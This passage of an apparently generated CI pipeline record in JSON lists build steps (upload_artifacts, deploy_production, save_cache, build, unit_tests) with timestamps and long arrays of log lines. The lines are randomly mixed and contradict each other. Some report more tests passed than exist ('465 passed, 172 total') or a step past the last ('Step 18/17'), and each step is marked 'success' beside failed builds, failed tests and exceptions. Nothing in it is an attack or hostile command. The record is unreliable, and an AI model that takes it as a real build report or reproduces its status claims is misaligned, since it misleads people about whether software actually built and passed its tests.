          "Exception: RuntimeError",
          "Installing react@4.18.6",
          "Step 3/15: Linting",
          "[12:46:06] DEBUG: Memory usage: 282MB",
          "\u2713 Task completed in 1649ms",
          "Tests: 465 passed, 172 total",
          "Platform: darwin-arm64",
          "Connection established",
          "[12:46:06] DEBUG: Query executed in 72ms",
          "Connection established",
          "npm install: resolved 296 packages",
          "[12:46:06] INFO: Cache refreshed",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "Test Suites: 44 passed, 9 total",
          "WARNING: react has known vulnerabilities",
          "Using Node.js 14.19.3",
          "pip: Downloading jest-2.17.tar.gz",
          "Cache invalidated: dependencies",
          "npm install: added 169 packages",
          "[12:46:06] INFO: Request completed",
          "Completed.",
          "Fetching submodules...",
          "[12:46:06] INFO: Request completed",
          "\u2713 lint completed",
          "Environment: production",
          "WARNING: express has known vulnerabilities",
          "Step 14/23: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "Fetching from https://npmjs.org/package.json",
          "OK",
          "Exception: TypeError",
          "npm install: resolved 884 packages",
          "Step 12/23: Linting",
          "POST /data - 200 (357ms)",
          "Ready.",
          "Pulling image: node:latest",
          "Compiling components/service.java...",
          "Compiling src/service.java...",
          "Exception: RuntimeError",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 deploy completed",
          "Step 3/22: Installing dependencies",
          "NODE_ENV=production",
          "[12:46:06] DEBUG: Initializing service",
          "Finished.",
          "Minifying main.js",
          "pip: Collecting webpack",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (355ms)",
          "[12:46:06] WARN: Deprecated API usage",
          "Completed.",
          "Cache miss for key-6295",
          "\u2713 Step 'setup' succeeded",
          "\u2713 Task completed in 4597ms",
          "Verifying...",
          "Success!",
          "Fetching submodules...",
          "Transforming 251 files...",
          "pip: Installing build dependencies...",
          "Environment: development",
          "[12:46:06] INFO: Processing request",
          "Cache saved successfully",
          "Cache miss for key-1298",
          "[12:46:06] ERROR: Connection failed",
          "\u2713 Step 'build' succeeded",
          "[12:46:06] DEBUG: Query executed in 62ms",
          "pip install: Successfully installed lodash-3.7",
          "[12:46:06] INFO: Starting build process",
          "Cache hit for key-6766",
          "Cache miss for key-8363",
          "Waiting...",
          "Step 9/18: Linting",
          "Snapshots: 50 passed, 50 total",
          "Artifact downloaded: 49MB",
          "Fetching from https://amazonaws.com/package.json",
          "Fetching submodules...",
          "TLS handshake completed",
          "Compiling utils/utils.go...",
          "Fetching from https://npmjs.org/package.json",
          "\u2713 Task completed in 3086ms",
          "[12:46:06] WARN: Deprecated API usage",
          "[12:46:06] INFO: Processing request",
          "Step 20/23: Building",
          "Compiling src/service.java...",
          "Verifying...",
          "[12:46:06] INFO: Request completed",
          "Processing...",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "[12:46:06] INFO: Starting build process",
          "npm install: added 353 packages",
          "[12:46:06] INFO: Request completed",
          "Step 15/19: Linting",
          "Optimizing 68 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:06] WARN: Deprecated API usage",
          "HEAD is now at cc9c77c",
          "Test Suites: 15 passed, 32 total",
          "Compiling components/app.ts...",
          "Ran 40 tests in 30s",
          "GET /api - 200 (85ms)",
          "[12:46:06] WARN: Deprecated API usage",
          "Test Suites: 28 passed, 14 total",
          "Building Docker image...",
          "Test Suites: 33 passed, 21 total",
          "\u2717 build failed with exit code 63",
          "Platform: linux-x64",
          "pip install: Successfully installed axios-3.12",
          "Generating source maps...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-04T12:47:43.039710",
        "finished_at": "2025-12-04T12:47:58.088513",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "FAILED: test_api_health",
          "Optimizing 30 modules...",
          "Installing lodash@3.18.5",
          "Minifying main.js",
          "NODE_ENV=test",
          "WARNING: prettier has known vulnerabilities",
          "Checking out main branch",
          "HEAD is now at 78b2f1a",
          "Cache miss for key-5852",
          "pip: Installing build dependencies...",
          "[12:46:06] DEBUG: Query executed in 5ms",
          "Step 20/24: Linting",
          "[12:46:06] INFO: Starting build process",
          "Using Python 3.9",
          "[12:46:06] INFO: Request completed",
          "Cache invalidated: node_modules",
          "Using Python 3.9",
          "Building Docker image...",
          "Creating production build...",
          "[12:46:06] INFO: Request completed",
          "Using Node.js 15.3.4",
          "WARNING: jest has known vulnerabilities",
          "Installing webpack@4.14.7",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching submodules...",
          "Time: 104.760s",
          "Time: 112.28s",
          "Test Suites: 42 passed, 6 total",
          "Coverage: 74% statements, 69% branches",
          "Completed.",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "TLS handshake completed",
          "Creating production build...",
          "Cache hit for key-4157",
          "Step 12/24: Deploying",
          "[12:46:06] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Uploading artifact 'coverage' (15 files)",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact downloaded: 38MB",
          "Checking out main branch",
          "Artifact uploaded: dist.zip (1MB)",
          "Tests: 295 passed, 139 total",
          "Cache saved successfully",
          "Completed.",
          "[12:46:06] ERROR: Connection failed",
          "GET /health - 204 (30ms)",
          "[12:46:06] INFO: Connecting to database",
          "\u2713 Step 'test' succeeded",
          "Using Python 3.10",
          "Completed.",
          "Layer 2/14: ENV command",
          "Compiling utils/main.py...",
          "[12:46:06] INFO: Processing request",
          "pip: Collecting express",
          "FAILED: test_db_connect",
          "yarn add: Done in 27.22s",
          "yarn add: Done in 14.78s",
          "Artifact uploaded: build.tar.gz (40MB)",
          "TLS handshake completed",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "Cache miss for key-6427",
          "pip install: Successfully installed jest-2.10",
          "Waiting...",
          "[12:46:06] INFO: Starting build process",
          "Minifying app.js",
          "\u2713 deploy completed",
          "[12:46:06] INFO: Connecting to database",
          "Exception: RuntimeError",
          "Using Python 3.10",
          "[12:46:06] DEBUG: Connection pool: 20 active",
          "Artifact downloaded: 22MB",
          "Completed.",
          "POST /api - 202 (51ms)",
          "\u2713 All checks passed",
          "[12:46:06] WARN: Deprecated API usage",
          "[12:46:06] INFO: Connecting to database",
          "[12:46:06] INFO: Processing request",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Compiling lib/service.java...",
          "Optimizing 68 modules...",
          "yarn add: Done in 21.23s",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "Cache miss for key-8910",
          "[12:46:06] WARN: Deprecated API usage",
          "[12:46:06] INFO: Cache refreshed",
          "Environment: test",
          "Completed.",
          "Layer 10/13: RUN command",
          "Step 4/18: Testing",
          "Bundling styles.js",
          "Image pulled successfully",
          "Cache restored successfully (133MB)",
          "POST /data - 202 (439ms)",
          "Step 3/21: Testing",
          "Compiling components/main.py...",
          "Using Node.js 19.3.7",
          "Layer 3/15: ENV command",
          "[12:46:06] ERROR: Connection failed",
          "  PASS: integration/test_auth_login.spec.js",
          "Transforming 516 files...",
          "Ready.",
          "Loading...",
          "Platform: darwin-arm64",
          "Checking out develop branch",
          "Step 10/24: Deploying",
          "Pushing to registry...",
          "[12:46:06] INFO: Request completed",
          "Cache restored successfully (185MB)",
          "Image pulled successfully",
          "\u2717 build failed with exit code 29",
          "Coverage: 75% statements, 61% branches",
          "Coverage: 96% statements, 70% branches",
          "Cache miss for key-1514",
          "[12:46:06] DEBUG: Query executed in 6ms",
          "\u2713 Task completed in 2302ms",
          "Compiling lib/service.java...",
          "[12:46:06] INFO: Connecting to database",
          "Step 12/21: Linting",
          "Image pulled successfully",
          "  PASS: test_user_create (70ms)",
          "[12:46:06] INFO: Starting build process",
          "Cache miss for key-9602",
          "npm install: resolved 684 packages",
          "OK",
          "Step 5/16: Linting",
          "Compiling src/app.ts...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Snapshots: 23 passed, 48 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "Completed.",
          "[12:46:06] WARN: Deprecated API usage",
          "Done.",
          "Switched to branch 'feature/task-895'",
          "Completed.",
          "[12:46:06] INFO: Starting build process",
          "Coverage: 75% statements, 77% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Optimizing 70 modules...",
          "[12:46:06] INFO: Connecting to database",
          "[12:46:06] WARN: Deprecated API usage",
          "Waiting...",
          "pip: Downloading react-2.16.tar.gz",
          "  PASS: test_user_create (354ms)",
          "Snapshots: 29 passed, 8 total",
          "Cache restored successfully (341MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/index.js...",
          "\u2717 build failed with exit code 106",
          "Already up to date.",
          "Success!",
          "Step 14/22: Running migrations",
          "Compiling utils/handler.rs...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-04T12:47:58.088513",
        "finished_at": "2025-12-04T12:48:04.108034",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u2713 Task completed in 591ms",
          "pip: Downloading react-5.11.tar.gz",
          "Completed.",
          "Exception: ValueError",
          "[12:46:06] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Optimizing 46 modules...",
          "pip: Collecting react",
          "Compiling components/service.java...",
          "Image pulled successfully",
          "Cache hit for key-1896",
          "[12:46:06] DEBUG: Loading configuration",
          "\u2713 Task completed in 1211ms",
          "Step 2/20: Deploying",
          "Already up to date.",
          "Creating production build...",
          "Transforming 768 files...",
          "Image pulled successfully",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "[12:46:06] WARN: Deprecated API usage",
          "FAILED: test_db_connect",
          "[12:46:06] DEBUG: Connection pool: 17 active",
          "Step 6/16: Deploying",
          "Already up to date.",
          "Transforming 537 files...",
          "Already up to date.",
          "Uploading artifact 'dist' (35 files)",
          "FAILED: test_auth_login",
          "  PASS: integration/test_auth_login.spec.js",
          "Bundling runtime.css",
          "Tests: 312 passed, 110 total",
          "Finished.",
          "[12:46:06] INFO: Request completed",
          "Optimizing 85 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:06] WARN: Deprecated API usage",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Layer 2/13: ENV command",
          "Artifact uploaded: build.tar.gz (43MB)",
          "pip install: Successfully installed prettier-4.2",
          "Ready.",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:06] DEBUG: Connection pool: 11 active",
          "\u2713 Task completed in 1442ms",
          "[12:46:06] INFO: Request completed",
          "Layer 4/15: RUN command",
          "Installing lodash@5.8.7",
          "[12:46:06] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Step 1/24: Running migrations",
          "Layer 2/15: COPY command",
          "npm notice: package.json updated",
          "Coverage: 75% statements, 73% branches",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 3/25: Testing",
          "[12:46:06] DEBUG: Memory usage: 1154MB",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 288 passed, 291 total",
          "\u2713 All checks passed",
          "Cache hit for key-5245",
          "\u2717 build failed with exit code 46",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:06] INFO: Connecting to database",
          "npm install: added 233 packages",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "Step 5/25: Testing",
          "Installing prettier@4.11.5",
          "Fetching submodules...",
          "Success!",
          "Loading...",
          "Tests: 413 passed, 176 total",
          "Already up to date.",
          "Transforming 609 files...",
          "Already up to date.",
          "Time: 66.778s",
          "Step 18/17: Testing",
          "Optimizing 17 modules...",
          "[12:46:06] WARN: Deprecated API usage",
          "HEAD is now at e1da5fa",
          "Fetching submodules...",
          "Cache invalidated: dependencies",
          "Cache hit for key-7858",
          "GET /status - 204 (61ms)",
          "Tests: 494 passed, 56 total",
          "Step 5/24: Installing dependencies",
          "[12:46:06] INFO: Starting build process",
          "[12:46:06] INFO: Cache refreshed",
          "Already up to date.",
          "[12:46:06] DEBUG: Memory usage: 294MB",
          "Step 13/23: Running migrations",
          "[12:46:06] DEBUG: Loading configuration",
          "Step 18/16: Running migrations",
          "\u2713 test completed",
          "Uploading artifact 'dist' (14 files)",
          "Exception: TypeError",
          "Completed.",
          "Step 2/22: Installing dependencies",
          "[12:46:06] WARN: Deprecated API usage",
          "Step 13/22: Running migrations",
          "Step 14/19: Building",
          "Platform: darwin-arm64",
          "[12:46:06] DEBUG: Connection pool: 15 active",
          "Time: 70.387s",
          "npm install: resolved 554 packages",
          "Cache hit for key-1534",
          "Pushing to registry...",
          "Optimizing 68 modules...",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at 86109be",
          "yarn add: Done in 4.36s",
          "[12:46:06] DEBUG: Memory usage: 1835MB",
          "Coverage: 95% statements, 81% branches",
          "[12:46:06] DEBUG: Loading configuration",
          "npm install: resolved 659 packages",
          "Pushing to registry...",
          "Uploading artifact 'dist' (9 files)",
          "[12:46:06] DEBUG: Loading configuration",
          "[12:46:06] INFO: Processing request",
          "HEAD is now at 7e03736",
          "[12:46:06] DEBUG: Connection pool: 12 active",
          "Layer 1/12: RUN command",
          "Done.",
          "npm install: added 17 packages",
          "yarn add: Done in 2.57s",
          "Compiling src/main.py...",
          "Finished.",
          "WARNING: express has known vulnerabilities",
          "Ready.",
          "[12:46:06] INFO: Processing request",
          "Compiling src/utils.go...",
          "Pulling image: node:3.11",
          "Coverage: 92% statements, 86% branches",
          "[12:46:06] INFO: Connecting to database",
          "[12:46:06] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "Already up to date.",
          "Verifying...",
          "Ready.",
          "Platform: win32-x64",
          "Already up to date.",
          "Checking out main branch",
          "Step 16/17: Installing dependencies",
          "Coverage: 86% statements, 79% branches",
          "Optimizing 23 modules...",
          "Tests: 234 passed, 181 total",
          "Compiling utils/service.java...",
          "Using Node.js 15.7.1",
          "[12:46:06] INFO: Processing request",
          "pip: Downloading webpack-3.19.tar.gz",
          "Optimizing 40 modules...",
          "pip: Installing build dependencies...",
          "WARNING: lodash has known vulnerabilities",
          "FAILED: test_db_connect",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-04T12:48:04.108034",
        "finished_at": "2025-12-04T12:48:13.137316",
        "log_lines": [
          "=== Step: save_cache ===",
          "Pulling image: alpine:18",
          "[12:46:06] INFO: Processing request",
          "Coverage: 86% statements, 99% branches",
          "[12:46:06] INFO: Processing request",
          "Artifact downloaded: 7MB",
          "[12:46:06] INFO: Request completed",
          "Installing jest@2.2.8",
          "\u2713 All checks passed",
          "Minifying vendor.js",
          "[12:46:06] DEBUG: Initializing service",
          "\u2713 Step 'build' succeeded",
          "Ran 73 tests in 55s",
          "Artifact uploaded: build.tar.gz (49MB)",
          "OK",
          "Fetching from https://githubusercontent.com/package.json",
          "Installing lodash@1.13.3",
          "[12:46:06] DEBUG: Connection pool: 19 active",
          "Completed.",
          "[12:46:06] WARN: Deprecated API usage",
          "yarn add: Done in 29.25s",
          "[12:46:06] DEBUG: Query executed in 82ms",
          "POST /upload - 202 (432ms)",
          "TLS handshake completed",
          "Minifying main.js",
          "Coverage: 81% statements, 97% branches",
          "Step 2/17: Testing",
          "Creating production build...",
          "  PASS: integration/test_auth_login.spec.js",
          "Pulling image: python:18",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (68MB)",
          "Waiting...",
          "npm notice: package.json updated",
          "pip: Collecting eslint",
          "Layer 4/13: COPY command",
          "\u2717 build failed with exit code 50",
          "Checking out develop branch",
          "Image pulled successfully",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Ran 199 tests in 41s",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Optimizing 12 modules...",
          "[12:46:06] DEBUG: Connection pool: 8 active",
          "[12:46:06] INFO: Request completed",
          "Bundling styles.css",
          "POST /data - 202 (186ms)",
          "Optimizing 89 modules...",
          "Environment: development",
          "WARNING: prettier has known vulnerabilities",
          "Pulling image: alpine:18",
          "Verifying...",
          "pip install: Successfully installed webpack-1.15",
          "Building Docker image...",
          "\u2717 build failed with exit code 76",
          "Cache saved successfully",
          "Connection established",
          "\u2713 All checks passed",
          "Coverage: 91% statements, 80% branches",
          "POST /data - 201 (155ms)",
          "Waiting...",
          "Image pulled successfully",
          "Snapshots: 19 passed, 43 total",
          "POST /data - 201 (334ms)",
          "npm notice: created a lockfile",
          "Cache invalidated: build",
          "Uploading artifact 'build' (32 files)",
          "npm notice: created a lockfile",
          "Time: 120.905s",
          "Cache restored successfully (228MB)",
          "[12:46:06] DEBUG: Memory usage: 1842MB",
          "Finished.",
          "Building Docker image...",
          "Compiling components/service.java...",
          "Artifact uploaded: dist.zip (39MB)",
          "npm notice: package.json updated",
          "[12:46:06] INFO: Processing request",
          "[12:46:06] DEBUG: Memory usage: 1633MB",
          "Using Python 3.9",
          "NODE_ENV=test",
          "Tests: 463 passed, 129 total",
          "POST /upload - 200 (88ms)",
          "Building Docker image...",
          "[12:46:06] DEBUG: Initializing service",
          "Already up to date.",
          "\u2713 Task completed in 2753ms",
          "Tests: 423 passed, 329 total",
          "POST /data - 200 (256ms)",
          "Processing...",
          "Bundling runtime.js",
          "Transforming 409 files...",
          "Step 3/21: Linting",
          "pip: Downloading express-4.19.tar.gz",
          "Layer 6/15: ENV command",
          "[12:46:06] ERROR: Connection failed",
          "Transforming 850 files...",
          "pip: Collecting jest",
          "WARNING: jest has known vulnerabilities",
          "FAILED: test_user_create",
          "Cache hit for key-9084",
          "[12:46:06] DEBUG: Query executed in 68ms",
          "WARNING: express has known vulnerabilities",
          "npm install: added 209 packages",
          "Compiling lib/handler.rs...",
          "Done.",
          "pip install: Successfully installed lodash-1.1",
          "WARNING: prettier has known vulnerabilities",
          "Snapshots: 27 passed, 4 total",
          "[12:46:06] WARN: Deprecated API usage",
          "[12:46:06] DEBUG: Memory usage: 1017MB",
          "\u2713 All checks passed",
          "Step 10/22: Deploying",
          "Using Python 3.9",
          "Optimizing 62 modules...",
          "Cache invalidated: node_modules",
          "\u2717 build failed with exit code 3",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: integration/test_user_create.spec.js",
          "GET /health - 200 (5ms)",
          "yarn add: Done in 8.7s",
          "Completed.",
          "Step 15/20: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "Verifying...",
          "Building Docker image...",
          "Success!",
          "POST /upload - 201 (214ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:06] DEBUG: Query executed in 40ms",
          "Generating source maps...",
          "yarn add: Done in 23.27s",
          "NODE_ENV=test",
          "[12:46:06] WARN: Deprecated API usage",
          "Ran 29 tests in 3s",
          "pip: Collecting express",
          "WARNING: webpack has known vulnerabilities",
          "Step 3/18: Installing dependencies",
          "Step 4/22: Building",
          "\u2717 build failed with exit code 50",
          "Bundling runtime.css",
          "Cache invalidated: build",
          "OK",
          "Ready.",
          "[12:46:06] DEBUG: Initializing service",
          "Snapshots: 11 passed, 35 total",
          "[12:46:06] WARN: Deprecated API usage",
          "Minifying vendor.js",
          "Artifact downloaded: 45MB",
          "Bundling vendor.css",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "[12:46:06] DEBUG: Query executed in 71ms",
          "Image pulled successfully",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "\u2713 All checks passed",
          "WARNING: axios has known vulnerabilities",
          "Pulling image: alpine:18",
          "TLS handshake completed",
          "[12:46:06] DEBUG: Initializing service",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-04T12:48:13.137316",
        "finished_at": "2025-12-04T12:48:58.283725",
        "log_lines": [
          "=== Step: build ===",
          "npm notice: created a lockfile",
          "pip: Collecting prettier",
          "Cache restored successfully (443MB)",
          "Generating source maps...",
          "Image pulled successfully",
          "Step 2/19: Deploying",
          "Environment: staging",
          "Step 6/16: Deploying",
          "Cache hit for key-8502",
          "Ready.",
          "Layer 4/10: ENV command",
          "[12:46:06] DEBUG: Query executed in 54ms",
          "[12:46:06] INFO: Cache refreshed",
          "Time: 100.270s",
          "npm install: added 120 packages",
          "[12:46:06] DEBUG: Connection pool: 16 active",
          "pip: Collecting jest",
          "[12:46:06] INFO: Processing request",
          "\u2713 deploy completed",
          "FAILED: test_api_health",
          "[12:46:06] DEBUG: Query executed in 37ms",
          "Cache hit for key-9019",
          "npm install: resolved 1924 packages",
          "Switched to branch 'bugfix/task-240'",
          "Cache miss for key-4150",
          "Exception: ValueError",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2713 Step 'test' succeeded",
          "Pulling image: alpine:18",
          "Connection established",
          "Processing...",
          "Checking out develop branch",
          "pip: Collecting webpack",
          "Fetching submodules...",
          "Step 7/25: Installing dependencies",
          "Switched to branch 'hotfix/task-945'",
          "Generating source maps...",
          "Bundling styles.js",
          "Tests: 256 passed, 495 total",
          "Uploading artifact 'coverage' (32 files)",
          "HEAD is now at 6eed82b",
          "[12:46:06] INFO: Cache refreshed",
          "Loading...",
          "  PASS: integration/test_user_create.spec.js",
          "[12:46:06] INFO: Cache refreshed",
          "WARNING: express has known vulnerabilities",
          "[12:46:06] DEBUG: Loading configuration",
          "[12:46:06] INFO: Starting build process",
          "Fetching submodules...",
          "Pushing to registry...",
          "Pushing to registry...",
          "npm install: resolved 937 packages",
          "Finished.",
          "Step 8/23: Building",
          "npm notice: package.json updated",
          "Step 5/18: Deploying",
          "Cache miss for key-8776",
          "WARNING: prettier has known vulnerabilities",
          "Using Node.js 20.15.5",
          "Time: 103.743s",
          "Pulling image: python:18",
          "[12:46:06] INFO: Request completed",
          "Loading...",
          "GET /health - 201 (26ms)",
          "Loading...",
          "Switched to branch 'bugfix/task-116'",
          "POST /upload - 202 (265ms)",
          "npm install: resolved 854 packages",
          "Artifact downloaded: 44MB",
          "pip: Collecting react",
          "Artifact uploaded: build.tar.gz (33MB)",
          "yarn add: Done in 15.53s",
          "[12:46:06] DEBUG: Initializing service",
          "Test Suites: 18 passed, 34 total",
          "Completed.",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Tests: 478 passed, 98 total",
          "TLS handshake completed",
          "Creating production build...",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Installing prettier@2.4.4",
          "Switched to branch 'bugfix/task-846'",
          "FAILED: test_user_create",
          "Platform: linux-x64",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "WARNING: react has known vulnerabilities",
          "Image pulled successfully",
          "[12:46:06] DEBUG: Loading configuration",
          "Verifying...",
          "pip: Collecting webpack",
          "Snapshots: 19 passed, 45 total",
          "Layer 10/15: COPY command",
          "\u2713 Step 'setup' succeeded",
          "Installing express@3.6.9",
          "Snapshots: 40 passed, 29 total",
          "Environment: test",
          "FAILED: test_user_create",
          "  PASS: unit/test_auth_login.spec.js",
          "Waiting...",
          "Test Suites: 13 passed, 48 total",
          "npm notice: package.json updated",
          "Fetching from https://gcr.io/package.json",
          "[12:46:06] INFO: Processing request",
          "Compiling utils/utils.go...",
          "Image pulled successfully",
          "TLS handshake completed",
          "Fetching from https://gcr.io/package.json",
          "Verifying...",
          "[12:46:06] DEBUG: Memory usage: 969MB",
          "[12:46:06] INFO: Connecting to database",
          "pip: Collecting eslint",
          "  PASS: test_auth_login (20ms)",
          "Connection established",
          "Ran 136 tests in 24s",
          "TLS handshake completed",
          "\u2713 Task completed in 1174ms",
          "Cache miss for key-5309",
          "Step 9/21: Running migrations",
          "Verifying...",
          "[12:46:06] DEBUG: Connection pool: 5 active",
          "Compiling lib/service.java...",
          "Step 7/24: Installing dependencies",
          "Using Node.js 16.13.7",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Optimizing 34 modules...",
          "Compiling lib/app.ts...",
          "[12:46:06] INFO: Cache refreshed",
          "OK",
          "[12:46:06] WARN: Deprecated API usage",
          "Minifying app.js",
          "[12:46:06] INFO: Request completed",
          "Already up to date.",
          "\u2713 lint completed",
          "Exception: ValueError",
          "Using Node.js 16.0.10",
          "Compiling lib/main.py...",
          "Step 11/23: Installing dependencies",
          "Using Python 3.10",
          "yarn add: Done in 23.18s",
          "Cache miss for key-3663",
          "  PASS: test_user_create (259ms)",
          "Done.",
          "\u2713 package completed",
          "Platform: linux-x64",
          "Connection established",
          "Platform: linux-x64",
          "NODE_ENV=production",
          "[12:46:06] INFO: Starting build process",
          "Creating production build...",
          "Cache saved successfully",
          "Installing react@5.11.3",
          "Compiling components/utils.go...",
          "Cache restored successfully (270MB)",
          "Minifying main.js",
          "Step 8/16: Deploying",
          "\u2717 build failed with exit code 36",
          "Step 13/17: Installing dependencies",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-04T12:48:58.283725",
        "finished_at": "2025-12-04T12:49:43.430134",
        "log_lines": [
          "=== Step: unit_tests ===",
          "  PASS: test_auth_login (491ms)",
          "Test Suites: 10 passed, 14 total",
          "Using Python 3.9",
          "\u2713 All checks passed",
          "  PASS: integration/test_auth_login.spec.js",
          "Cache restored successfully (457MB)",
          "Cache miss for key-3744",
          "[12:46:06] ERROR: Connection failed",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:46:06] DEBUG: Connection pool: 11 active",
          "yarn add: Done in 7.64s",
          "Environment: development",
          "Artifact uploaded: dist.zip (32MB)",
          "[12:46:06] DEBUG: Loading configuration",
          "FAILED: test_api_health",
          "Step 8/25: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:06] INFO: Request completed",
          "Processing...",
          "Step 18/17: Deploying",
          "Compiling components/app.ts...",
          "Transforming 250 files...",
          "Ready.",
          "[12:46:06] DEBUG: Loading configuration",
          "Success!",
          "yarn add: Done in 5.49s",
          "pip: Downloading webpack-5.5.tar.gz",
          "yarn add: Done in 23.28s",
          "POST /upload - 200 (283ms)",
          "npm notice: created a lockfile",
          "[12:46:06] INFO: Connecting to database",
          "[12:46:06] DEBUG: Initializing service",
          "[12:46:06] DEBUG: Memory usage: 1956MB",
          "Compiling components/main.py...",
          "Processing...",
          "[12:46:06] WARN: Deprecated API usage",
          "Installing prettier@3.2.10",
          "Step 3/19: Testing",
          "Step 13/22: Building",
          "[12:46:06] ERROR: Connection failed",
          "Step 15/19: Testing",
          "Uploading artifact 'dist' (4 files)",
          "yarn add: Done in 19.78s",
          "Layer 6/11: ENV command",
          "[12:46:06] INFO: Starting build process",
          "[12:46:06] INFO: Connecting to database",
          "Success!",
          "[12:46:06] INFO: Cache refreshed",
          "Processing...",
          "Completed.",
          "\u2717 build failed with exit code 46",
          "Processing...",
          "Creating production build...",
          "Image pulled successfully",
          "npm install: resolved 877 packages",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Layer 6/11: RUN command",
          "Checking out main branch",
          "Completed.",
          "Verifying...",
          "Cache restored successfully (490MB)",
          "\u2713 Step 'build' succeeded",
          "pip: Collecting webpack",
          "npm install: added 274 packages",
          "npm notice: package.json updated",
          "\u2713 lint completed",
          "Optimizing 32 modules...",
          "[12:46:06] DEBUG: Loading configuration",
          "OK",
          "Ready.",
          "Step 19/21: Installing dependencies",
          "yarn add: Done in 1.83s",
          "  PASS: test_cache_hit (24ms)",
          "Completed.",
          "[12:46:06] DEBUG: Loading configuration",
          "[12:46:06] INFO: Request completed",
          "pip: Downloading react-1.10.tar.gz",
          "pip: Downloading eslint-3.13.tar.gz",
          "Compiling utils/index.js...",
          "[12:46:06] ERROR: Connection failed",
          "Step 19/22: Linting",
          "WARNING: prettier has known vulnerabilities",
          "Compiling components/app.ts...",
          "Installing eslint@1.1.10",
          "Fetching submodules...",
          "[12:46:06] DEBUG: Loading configuration",
          "FAILED: test_user_create",
          "\u2713 Step 'setup' succeeded",
          "[12:46:06] DEBUG: Initializing service",
          "Completed.",
          "Environment: staging",
          "\u2713 lint completed",
          "Compiling utils/utils.go...",
          "WARNING: jest has known vulnerabilities",
          "Waiting...",
          "Cache hit for key-3346",
          "[12:46:06] INFO: Starting build process",
          "Using Python 3.12",
          "pip install: Successfully installed eslint-5.20",
          "Connection established",
          "Creating production build...",
          "Transforming 271 files...",
          "Installing axios@4.2.6",
          "[12:46:06] WARN: Deprecated API usage",
          "Step 15/16: Running migrations",
          "Processing...",
          "\u2713 test completed",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "Test Suites: 35 passed, 44 total",
          "pip install: Successfully installed jest-2.2",
          "Installing axios@2.1.1",
          "Cache invalidated: node_modules",
          "[12:46:06] DEBUG: Query executed in 91ms",
          "Done.",
          "Checking out master branch",
          "\u2713 deploy completed",
          "Coverage: 85% statements, 62% branches",
          "Pulling image: node:18",
          "[12:46:06] DEBUG: Initializing service",
          "npm install: added 114 packages",
          "Compiling lib/index.js...",
          "Bundling styles.css",
          "Exception: TypeError",
          "Generating source maps...",
          "Platform: win32-x64",
          "Cache saved successfully",
          "Compiling components/handler.rs...",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "\u2713 deploy completed",
          "\u2713 Step 'setup' succeeded",
          "[12:46:06] DEBUG: Connection pool: 14 active",
          "Verifying...",
          "pip: Downloading eslint-5.16.tar.gz",
          "Pulling image: alpine:3.11",
          "WARNING: webpack has known vulnerabilities",
          "Fetching submodules...",
          "Pulling image: python:3.11",
